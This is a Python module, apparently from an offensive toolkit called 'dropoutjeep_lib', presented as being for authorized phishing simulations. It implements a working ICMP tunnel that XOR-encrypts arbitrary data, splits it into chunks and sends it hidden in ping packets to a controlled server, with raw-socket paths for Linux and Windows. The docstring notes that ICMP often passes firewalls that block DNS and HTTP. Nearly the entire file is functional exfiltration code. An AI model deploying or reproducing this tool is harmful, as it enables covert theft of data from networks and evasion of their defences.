"""ICMP tunnel exfiltration channel for authorized phishing simulations.

Raw ICMP echo requests with encrypted payload. Western firewalls generally
allow ICMP — it passes through where DNS and HTTP may be blocked.

This module constructs ICMP echo packets with data embedded in the payload
field. On Linux, raw socket injection requires root. On Windows, the IcmpSendEcho
API can be used via ctypes. This module provides both paths.

Usage:
    from dropoutjeep_lib.utils.icmp_exfil import IcmpExfil
    tunnel = IcmpExfil(destination='10.0.0.1', key='mysecret')
    tunnel.exfiltrate(b'sensitive data here')
"""

import base64
import hashlib
import logging
import os
import socket
import struct
import time
from typing import Optional

logger = logging.getLogger("dropoutjeep")

# ICMP type codes
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with a repeating key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def _build_icmp_packet(identifier: int, sequence: int, payload: bytes) -> bytes:
    """Build a raw ICMP echo request packet.

    Header: type(1) + code(1) + checksum(2) + id(2) + seq(2) + payload
    """
    header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0, 0, identifier, sequence)
    packet = header + payload

    # Calculate checksum
    checksum = _icmp_checksum(packet)
    header = struct.pack('!BBHHH', ICMP_ECHO_REQUEST, 0, checksum, identifier, sequence)
    return header + payload


def _icmp_checksum(data: bytes) -> int:
    """Calculate ICMP checksum (one's complement of one's complement sum)."""
    if len(data) % 2:
        data += b'\x00'

    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        total += word

    total = (total >> 16) + (total & 0xFFFF)
    total += (total >> 16)

    return (~total) & 0xFFFF


class IcmpExfil:
    """ICMP tunnel exfiltration channel.

    Embeds encrypted data in ICMP echo request payloads.
    Requires raw socket capability (root/admin) on Linux,
    or uses Windows IcmpSendEcho API via ctypes.

    Args:
        destination: Target IP address (controlled server)
        key: Encryption key for payload
        max_payload_size: Max bytes per ICMP packet (default 1024)
        delay: Delay between packets in seconds
    """

    def __init__(self, destination: str, key: str = "default_key",
                 max_payload_size: int = 1024, delay: float = 0.3):
        self.destination = destination
        self.key = hashlib.sha256(key.encode()).digest()[:16]
        self.max_payload_size = max_payload_size
        self.delay = delay
        self._socket = None
        self._is_windows = os.name == 'nt'

    def _get_raw_socket(self):
        """Get a raw socket for ICMP. Requires root on Linux."""
        if self._socket is None:
            try:
                self._socket = socket.socket(
                    socket.AF_INET,
                    socket.SOCK_RAW,
                    socket.IPPROTO_ICMP
                )
            except PermissionError:
                if self._is_windows:
                    logger.error("Raw socket creation failed. Run as Administrator.")
                else:
                    logger.error("Raw socket creation failed. Run as root.")
                raise
        return self._socket

    def _send_windows(self, packet: bytes) -> bool:
        """Send ICMP packet on Windows using ctypes IcmpSendEcho."""
        try:
            import ctypes
            from ctypes import wintypes

            # Load icmp.dll
            icmp = ctypes.windll.iphlpapi

            # IcmpSendEcho prototype
            # DWORD IcmpSendEcho(HANDLE IcmpHandle, IPAddr DestinationAddress,
            #   LPVOID RequestData, WORD RequestSize, PIP_OPTION_INFORMATION RequestOptions,
            #   LPVOID ReplyBuffer, DWORD ReplySize, DWORD Timeout)
            icmp_handle = icmp.IcmpCreateFile()
            if icmp_handle == -1:
                logger.error("Failed to create ICMP handle on Windows")
                return False

            dest_addr = socket.inet_aton(self.destination)
            dest_ip = struct.unpack('!I', dest_addr)[0]

            # Use the payload as the echo data (skip ICMP header on Windows —
            # IcmpSendEcho builds its own header)
            reply_size = 1024
            reply_buf = ctypes.create_string_buffer(reply_size)

            result = icmp.IcmpSendEcho(
                icmp_handle,
                dest_ip,
                packet[8:],  # Skip our header, send payload only
                len(packet) - 8,
                None,
                reply_buf,
                reply_size,
                5000  # timeout ms
            )

            icmp.IcmpCloseHandle(icmp_handle)

            if result > 0:
                logger.debug("ICMP echo sent to %s (Windows)", self.destination)
                return True
            else:
                logger.warning("ICMP echo failed on Windows (result=%d)", result)
                return False

        except Exception as e:
            logger.error("Windows ICMP send error: %s", e)
            return False

    def _send_linux(self, packet: bytes) -> bool:
        """Send ICMP packet on Linux using raw socket."""
        try:
            sock = self._get_raw_socket()
            sock.sendto(packet, (self.destination, 0))
            logger.debug("ICMP echo sent to %s (Linux)", self.destination)
            return True
        except Exception as e:
            logger.warning("ICMP send error (Linux): %s", e)
            return False

    def send_packet(self, payload: bytes, identifier: int = 0x1234,
                   sequence: int = 1) -> bool:
        """Send a single ICMP echo request with embedded payload.

        The payload is XOR-encrypted before embedding.
        """
        encrypted = _xor_encrypt(payload, self.key)
        packet = _build_icmp_packet(identifier, sequence, encrypted)

        if self._is_windows:
            return self._send_windows(packet)
        else:
            return self._send_linux(packet)

    def exfiltrate(self, data: bytes, identifier: int = 0x1234) -> bool:
        """Exfiltrate arbitrary bytes via ICMP tunnel.

        Splits data into chunks, each sent as an ICMP echo request payload.
        A header chunk is sent first containing the total chunk count.

        Args:
            data: Raw bytes to exfiltrate
            identifier: ICMP identifier (for matching on server side)

        Returns:
            True if all packets were sent successfully.
        """
        if not data:
            return True

        # Encrypt all data first
        encrypted = _xor_encrypt(data, self.key)

        # Reserve 4 bytes per chunk for sequence number
        chunk_size = self.max_payload_size - 4
        chunks = []
        for i in range(0, len(encrypted), chunk_size):
            chunk_data = encrypted[i:i + chunk_size]
            # Prepend sequence number (4 bytes, big-endian)
            seq_bytes = struct.pack('!I', len(chunks))
            chunks.append(seq_bytes + chunk_data)

        # Send header: total_chunks (4 bytes) + total_data_len (4 bytes)
        header = struct.pack('!II', len(chunks), len(encrypted))
        success = self.send_packet(header, identifier=identifier, sequence=0)
        if not success:
            logger.error("Failed to send ICMP header packet")
            return False

        time.sleep(self.delay)

        # Send data chunks
        all_sent = True
        for i, chunk in enumerate(chunks):
            success = self.send_packet(chunk, identifier=identifier, sequence=i + 1)
            if not success:
                all_sent = False
            time.sleep(self.delay)

        logger.info("ICMP exfil complete: %d packets sent to %s, success=%s",
                    len(chunks), self.destination, all_sent)
        return all_sent

    def exfiltrate_string(self, text: str, identifier: int = 0x1234) -> bool:
        """Convenience method to exfiltrate a string."""
        return self.exfiltrate(text.encode('utf-8'), identifier)

    def close(self):
        """Close the raw socket if open."""
        if self._socket:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None
